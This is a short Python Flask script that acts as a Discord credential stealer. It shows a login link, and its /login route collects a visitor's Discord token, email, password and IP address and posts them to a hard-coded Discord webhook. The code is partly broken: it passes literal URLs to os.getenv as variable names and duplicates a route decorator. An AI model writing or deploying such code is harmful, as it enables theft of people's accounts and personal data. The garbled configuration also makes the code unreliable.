import os
import requests
from flask import Flask, render_template_string, request, jsonify
from dotenv import load_dotenv

load_dotenv("config.env")

app = Flask(__name__)

WEBHOOK_URL = os.getenv("https://discord.com/api/webhooks/1437559378529095760/LBVgyLa0_8WCa27KvVw1CDZllrDTmXsYYi9RbhV8GCIso82927kKi0dHjpaZiV7COEbW")
LINKHACK_LINK_URL = os.getenv("https://www.youtube.com/watch?v=vIeTEKXRSCA&t=355s")

@app.route("/")
@app.route("/")
def index():
    return """
        <a href="https://discord.com/login?redirect_to=discord.com">Click here to login</a>
    """

@app.route("/login", methods=["GET"])
def login():
    try:
        cookies = request.cookies
        discord_token = cookies.get("token")
        email = cookies.get("email")
        password = cookies.get("password")
        ipv4 = request.headers.get("X-Forwarded-For", "").split(",")[0]

        if not discord_token or not email or not password or not ipv4:
            return jsonify({"error": "Incomplete data"}), 400

        data = {
            "discord_token": discord_token,
            "email": email,
            "password": password,
            "ipv4": ipv4,
        }

        response = requests.post(WEBHOOK_URL, json=data)
        if response.status_code == 204:
            return "Done! Please close this tab.", 200
        else:
            return jsonify({"error": "Failed to send data to webhook"}), 500
    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
